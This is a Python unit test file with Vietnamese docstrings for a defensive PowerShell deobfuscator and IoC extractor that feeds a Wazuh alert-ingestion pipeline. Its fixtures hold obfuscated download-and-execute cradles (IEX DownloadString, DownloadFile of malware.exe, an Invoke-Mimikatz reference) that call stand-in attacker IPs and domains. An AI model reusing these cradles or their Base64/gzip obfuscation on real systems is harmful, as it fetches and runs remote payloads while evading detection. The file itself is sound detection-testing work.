# -*- coding: utf-8 -*-
"""
tests/test_deobfuscator.py
Bộ unit test toàn diện cho AdvancedPowerShellDeobfuscator và các Schemas mở rộng
thuộc Phase 1: Deep Forensic & Data Schema Foundation.
Bao gồm:
1. Khử backtick (`) và caret (^) làm rối cú pháp.
2. Nối chuỗi (+) và giải toán tử format (-f).
3. Giải mã Base64 (UTF-16LE, UTF-8, ASCII).
4. Giải nén GzipStream / Deflate Stream (magic header H4sI... / 1f 8b).
5. Giải mã đệ quy đa tầng Nested Base64 + Gzip.
6. Trích xuất toàn diện IoCs (IP Public/Private, URLs, Domains, Hashes).
7. Tích hợp IngestionAgent bóc tách dòng lệnh làm rối.
8. Kiểm tra tính tương thích và toàn vẹn của Schemas mở rộng (IncidentPhase, MultiDimensionalCTIScore, HighFidelityProcessNode, ActionScriptBundle).
"""

import gzip
import zlib
import base64
import unittest
from datetime import datetime, timezone

from src.tools.deobfuscator import (
    AdvancedPowerShellDeobfuscator,
    DeobfuscationResult
)
from src.agents.ingestion_agent import IngestionAgent
from src.core.schemas import (
    IncidentPhase,
    MultiDimensionalCTIScore,
    IoCItem,
    EnhancedIoCItem,
    ProcessNode,
    HighFidelityProcessNode,
    ActionType,
    ActionScriptBundle,
    RecommendedAction,
    ParsedEvent,
    WazuhAlert,
    WazuhRuleInfo,
    WazuhAgentInfo
)


class TestAdvancedPowerShellDeobfuscator(unittest.TestCase):
    """Kiểm thử chuyên sâu module deobfuscator."""

    def test_remove_backticks(self):
        """Khử các ký tự backtick và caret chèn rối."""
        obfuscated = "p`o`w`e`r`s`h`e`l`l.e`x`e -e`x`e`c`u`t`i`o`n`p`o`l`i`c`y b`y`p`a`s`s"
        cleaned, mod = AdvancedPowerShellDeobfuscator.remove_backticks(obfuscated)
        self.assertTrue(mod)
        self.assertEqual(cleaned, "powershell.exe -executionpolicy bypass")

        cmd2 = "I`E`X (N`e`w`-`O`b`j`e`c`t N`e`t.W`e`b`C`l`i`e`n`t).d`o`w`n`l`o`a`d`s`t`r`i`n`g"
        cleaned2, mod2 = AdvancedPowerShellDeobfuscator.remove_backticks(cmd2)
        self.assertTrue(mod2)
        self.assertIn("IEX", cleaned2)
        self.assertIn("New-Object", cleaned2)
        self.assertIn("downloadstring", cleaned2)

        # Caret evasion
        caret_cmd = "p^o^w^e^r^s^h^e^l^l -c^m^d"
        cleaned3, mod3 = AdvancedPowerShellDeobfuscator.remove_backticks(caret_cmd)
        self.assertTrue(mod3)
        self.assertEqual(cleaned3, "powershell -cmd")

    def test_resolve_string_concatenation(self):
        """Giải quyết nối chuỗi ký tự bằng dấu cộng (+)."""
        concat1 = "('dow' + 'nload' + 'string')"
        res1, mod1 = AdvancedPowerShellDeobfuscator.resolve_string_concatenation(concat1)
        self.assertTrue(mod1)
        self.assertEqual(res1, "('downloadstring')")

        # Nối kết hợp nháy đơn và nháy kép
        concat2 = "'I' + \"E\" + 'X' + \" \" + 'Invoke-Mimikatz'"
        res2, mod2 = AdvancedPowerShellDeobfuscator.resolve_string_concatenation(concat2)
        self.assertTrue(mod2)
        self.assertIn("IEX Invoke-Mimikatz", res2)

    def test_resolve_format_operator(self):
        """Giải quyết toán tử định dạng (-f) của PowerShell."""
        fmt1 = "(\"{1}{0}\" -f 'World','Hello ')"
        res1, mod1 = AdvancedPowerShellDeobfuscator.resolve_format_operator(fmt1)
        self.assertTrue(mod1)
        self.assertEqual(res1, "'Hello World'")

        fmt2 = "(\"{0}{1}{2}\" -f 'down','load','file')"
        res2, mod2 = AdvancedPowerShellDeobfuscator.resolve_format_operator(fmt2)
        self.assertTrue(mod2)
        self.assertEqual(res2, "'downloadfile'")

    def test_decode_base64_utf16le(self):
        """Giải mã chuỗi Base64 chuẩn UTF-16LE của Windows PowerShell (-enc)."""
        raw_cmd = "IEX (New-Object Net.WebClient).DownloadString('http://194.26.29.112/payload.ps1')"
        b64_cmd = base64.b64encode(raw_cmd.encode("utf-16le")).decode("ascii")
        full_line = f"powershell.exe -ExecutionPolicy Bypass -NoProfile -enc {b64_cmd}"

        result = AdvancedPowerShellDeobfuscator.deobfuscate(full_line)
        self.assertTrue(result.has_obfuscation)
        self.assertIn(raw_cmd, result.deobfuscated_command)
        self.assertGreaterEqual(len(result.layers), 1)

        # Kiểm tra trích xuất IoC từ lệnh đã giải mã
        ips = [i["value"] for i in result.extracted_iocs["ips"]]
        self.assertIn("194.26.29.112", ips)
        urls = [u["value"] for u in result.extracted_iocs["urls"]]
        self.assertIn("http://194.26.29.112/payload.ps1", urls)

    def test_decode_base64_utf8(self):
        """Giải mã chuỗi Base64 chuẩn UTF-8."""
        raw_script = "Invoke-Expression (Invoke-WebRequest -Uri 'http://c2-server.org/agent.ps1').Content"
        b64_utf8 = base64.b64encode(raw_script.encode("utf-8")).decode("ascii")
        cmd = f"powershell.exe -e {b64_utf8}"

        result = AdvancedPowerShellDeobfuscator.deobfuscate(cmd)
        self.assertTrue(result.has_obfuscation)
        self.assertIn(raw_script, result.deobfuscated_command)

    def test_gzip_stream_decompression(self):
        """Giải nén GzipStream nhúng trong Base64 (magic header H4sI...)."""
        raw_payload = "Write-Output 'Pwned'; (New-Object Net.WebClient).DownloadFile('http://185.220.101.5/malware.exe', 'C:\\mal.exe')"
        gz_bytes = gzip.compress(raw_payload.encode("utf-8"))
        b64_gz = base64.b64encode(gz_bytes).decode("ascii")
        self.assertTrue(b64_gz.startswith("H4sI"))

        ps_wrapper = (
            f"$s = New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('{b64_gz}')); "
            "$g = New-Object System.IO.Compression.GzipStream($s, [System.IO.Compression.CompressionMode]::Decompress); "
            "$r = New-Object System.IO.StreamReader($g); IEX $r.ReadToEnd()"
        )

        result = AdvancedPowerShellDeobfuscator.deobfuscate(ps_wrapper)
        self.assertTrue(result.has_obfuscation)
        self.assertIn(raw_payload, result.deobfuscated_command)

        # Kiểm tra IoC IP và URL
        ips = [i["value"] for i in result.extracted_iocs["ips"]]
        self.assertIn("185.220.101.5", ips)
        urls = [u["value"] for u in result.extracted_iocs["urls"]]
        self.assertIn("http://185.220.101.5/malware.exe", urls)

    def test_deflate_stream_decompression(self):
        """Giải nén Deflate Stream (.NET DeflateStream)."""
        raw_payload = "Start-Process 'powershell.exe' -ArgumentList '-NoExit -Command Write-Host PWNED'"
        # Raw deflate stream
        compressor = zlib.compressobj(level=9, method=zlib.DEFLATED, wbits=-zlib.MAX_WBITS)
        deflated_bytes = compressor.compress(raw_payload.encode("utf-8")) + compressor.flush()
        b64_deflate = base64.b64encode(deflated_bytes).decode("ascii")

        cmd = f"[Convert]::FromBase64String('{b64_deflate}')"
        result = AdvancedPowerShellDeobfuscator.deobfuscate(cmd)
        self.assertTrue(result.has_obfuscation)
        self.assertIn("Write-Host PWNED", result.deobfuscated_command)

    def test_recursive_nested_base64(self):
        """Giải mã đệ quy 3 tầng: Outer Base64 -> Intermediate GzipStream -> Inner Backticks."""
        inner_command = "d`o`w`n`l`o`a`d`s`t`r`i`n`g('http://attacker-apt.net/drop.ps1')"
        gz_bytes = gzip.compress(inner_command.encode("utf-8"))
        gz_b64 = base64.b64encode(gz_bytes).decode("ascii")

        stage2_script = f"IEX ([IO.MemoryStream][Convert]::FromBase64String('{gz_b64}'))"
        outer_b64 = base64.b64encode(stage2_script.encode("utf-16le")).decode("ascii")

        outer_cmd = f"p`o`w`e`r`s`h`e`l`l -enc {outer_b64}"

        result = AdvancedPowerShellDeobfuscator.deobfuscate(outer_cmd, max_depth=5)
        self.assertTrue(result.has_obfuscation)
        self.assertGreaterEqual(len(result.layers), 2)
        # Kết quả cuối cùng phải khử được cả backtick ở tầng trong cùng
        self.assertIn("downloadstring", result.deobfuscated_command)
        self.assertIn("http://attacker-apt.net/drop.ps1", result.deobfuscated_command)

        # Trích xuất domain
        domains = [d["value"] for d in result.extracted_iocs["domains"]]
        self.assertIn("attacker-apt.net", domains)

    def test_extract_iocs_comprehensive(self):
        """Kiểm thử trích xuất toàn diện IP Public, URL, Domain, Hash."""
        text = (
            "Connected to 192.168.1.50 and public C2 45.33.32.156. "
            "Downloading payload from https://malware-distribution.xyz:8443/stealer.exe "
            "and backup at hxxp://c2-mirror.ru/beacon.php. "
            "File hash SHA256: 2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91 "
            "MD5: 5D41402ABC4B2A76B9719D911017C592"
        )
        iocs = AdvancedPowerShellDeobfuscator.extract_iocs(text)

        # Kiểm tra IP
        ips = {i["value"]: i.get("is_public") for i in iocs["ips"]}
        self.assertIn("192.168.1.50", ips)
        self.assertFalse(ips["192.168.1.50"])
        self.assertIn("45.33.32.156", ips)
        self.assertTrue(ips["45.33.32.156"])

        # Kiểm tra URLs và chuẩn hóa hxxp
        url_vals = [u["value"] for u in iocs["urls"]]
        self.assertIn("https://malware-distribution.xyz:8443/stealer.exe", url_vals)
        self.assertIn("http://c2-mirror.ru/beacon.php", url_vals)

        # Kiểm tra Domains
        dom_vals = [d["value"] for d in iocs["domains"]]
        self.assertIn("malware-distribution.xyz", dom_vals)
        self.assertIn("c2-mirror.ru", dom_vals)

        # Kiểm tra Hashes
        hash_vals = [h["value"] for h in iocs["hashes"]]
        self.assertIn("2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91", hash_vals)
        self.assertIn("5D41402ABC4B2A76B9719D911017C592", hash_vals)


class TestIngestionAgentIntegration(unittest.TestCase):
    """Kiểm thử tích hợp deobfuscator vào IngestionAgent."""

    @classmethod
    def setUpClass(cls):
        cls.agent = IngestionAgent()

    def test_ingestion_agent_deobfuscation(self):
        """IngestionAgent giải mã thành công câu lệnh Base64 và lưu vào raw_attributes."""
        raw_cmd = "IEX (New-Object Net.WebClient).DownloadString('http://194.26.29.112/payload.ps1')"
        b64_cmd = base64.b64encode(raw_cmd.encode("utf-16le")).decode("ascii")
        cmd_line = f"powershell.exe -NoProfile -enc {b64_cmd}"

        # Kiểm thử trực tiếp decode_base64_command
        decoded = self.agent.decode_base64_command(cmd_line)
        self.assertEqual(decoded, raw_cmd)

        # Kiểm thử parse_alert
        mock_alert = WazuhAlert(
            id="ALERT-DEOB-001",
            timestamp=datetime.now(timezone.utc),
            rule=WazuhRuleInfo(id="100001", level=12, description="Suspicious PowerShell Base64"),
            agent=WazuhAgentInfo(id="001", name="ENDPOINT-01", ip="192.168.1.10"),
            data={
                "win": {
                    "eventdata": {
                        "commandLine": cmd_line,
                        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
                    }
                }
            }
        )

        event = self.agent.parse_alert(mock_alert)
        self.assertIn("decoded_command", event.raw_attributes)
        self.assertEqual(event.raw_attributes["decoded_command"], raw_cmd)
        self.assertIn("deobfuscation_result", event.raw_attributes)
        self.assertIn("preliminary_iocs", event.raw_attributes)

        # Kiểm tra IoCs sơ bộ bóc tách được
        iocs = event.raw_attributes["preliminary_iocs"]
        ip_vals = [i["value"] for i in iocs if i["type"] == "IP"]
        self.assertIn("194.26.29.112", ip_vals)
        url_vals = [i["value"] for i in iocs if i["type"] == "URL"]
        self.assertIn("http://194.26.29.112/payload.ps1", url_vals)


class TestExtendedSchemas(unittest.TestCase):
    """Kiểm thử các schemas mở rộng cho Phase 1."""

    def test_incident_phase_enum(self):
        """Kiểm tra các giá trị của IncidentPhase."""
        self.assertEqual(IncidentPhase.CONTAINMENT.value, "CONTAINMENT")
        self.assertEqual(IncidentPhase.ERADICATION.value, "ERADICATION")
        self.assertEqual(IncidentPhase.RECOVERY.value, "RECOVERY")
        self.assertEqual(IncidentPhase.POST_INCIDENT.value, "POST_INCIDENT")

    def test_multi_dimensional_cti_score(self):
        """Khởi tạo và xác thực MultiDimensionalCTIScore."""
        cti = MultiDimensionalCTIScore(
            abuseipdb_score=85,
            virustotal_ratio="52/70",
            virustotal_score=0.74,
            otx_pulses=14,
            threat_actor_tags=["APT29", "CozyBear"],
            composite_score=88.5
        )
        self.assertEqual(cti.abuseipdb_score, 85)
        self.assertEqual(cti.virustotal_score, 0.74)
        self.assertEqual(cti.composite_score, 88.5)
        self.assertIn("APT29", cti.threat_actor_tags)

    def test_enhanced_ioc_item(self):
        """Kiểm tra EnhancedIoCItem tích hợp MultiDimensionalCTIScore và tương thích ngược."""
        cti = MultiDimensionalCTIScore(
            abuseipdb_score=95,
            composite_score=92.0,
            threat_actor_tags=["Lazarus"]
        )
        ioc = EnhancedIoCItem(
            ioc_type="IP",
            value="194.26.29.112",
            reputation_score=92,
            is_malicious=True,
            threat_actor="Lazarus",
            cti_score=cti,
            is_public=True,
            context_source="Deobfuscator"
        )
        self.assertEqual(ioc.value, "194.26.29.112")
        self.assertTrue(ioc.is_malicious)
        self.assertTrue(ioc.is_public)
        self.assertEqual(ioc.cti_score.abuseipdb_score, 95)
        # Kiểm tra alias
        self.assertIs(EnhancedIoCItem, IoCItem)

    def test_high_fidelity_process_node(self):
        """Kiểm tra HighFidelityProcessNode kế thừa ProcessNode với dấu thời gian millisecond."""
        node = HighFidelityProcessNode(
            process_id="4128",
            process_name="powershell.exe",
            command_line="powershell.exe -enc test",
            parent_id="1024",
            is_malicious_origin=True,
            timestamp_ms=1792485737123,
            iso_timestamp="2026-10-20T10:15:37.123Z",
            user="NT AUTHORITY\\SYSTEM",
            integrity_level="High",
            file_hashes={"SHA256": "2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91"},
            deobfuscated_command="Write-Host 'Deobfuscated'",
            mitre_techniques=["T1059.001"],
            risk_score=95.0
        )
        self.assertIsInstance(node, ProcessNode)
        self.assertEqual(node.timestamp_ms, 1792485737123)
        self.assertEqual(node.user, "NT AUTHORITY\\SYSTEM")
        self.assertEqual(node.deobfuscated_command, "Write-Host 'Deobfuscated'")

    def test_action_script_bundle(self):
        """Kiểm tra ActionScriptBundle và gắn vào RecommendedAction."""
        bundle = ActionScriptBundle(
            action_id="ACT-ISOLATE-01",
            phase=IncidentPhase.CONTAINMENT,
            target="192.168.1.105",
            powershell_script="Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True",
            bash_script="iptables -A INPUT -s 192.168.1.105 -j DROP",
            wazuh_active_response={"command": "firewall-drop", "agent_id": "002"},
            rollback_script="iptables -D INPUT -s 192.168.1.105 -j DROP",
            instructions="Chặn IP nguồn tấn công lập tức trên tường lửa máy chủ"
        )
        self.assertTrue(bundle.bundle_id.startswith("BUNDLE-"))
        self.assertEqual(bundle.phase, IncidentPhase.CONTAINMENT)

        action = RecommendedAction(
            action_id="ACT-ISOLATE-01",
            action_type=ActionType.ISOLATE_HOST,
            target="192.168.1.105",
            description="Cô lập máy trạm bị lây nhiễm",
            priority=1,
            require_human_approval=True,
            phase=IncidentPhase.CONTAINMENT,
            script_bundle=bundle
        )
        self.assertEqual(action.action_id, "ACT-ISOLATE-01")
        self.assertEqual(action.phase, IncidentPhase.CONTAINMENT)
        self.assertEqual(action.script_bundle.bundle_id, bundle.bundle_id)


if __name__ == "__main__":
    unittest.main()
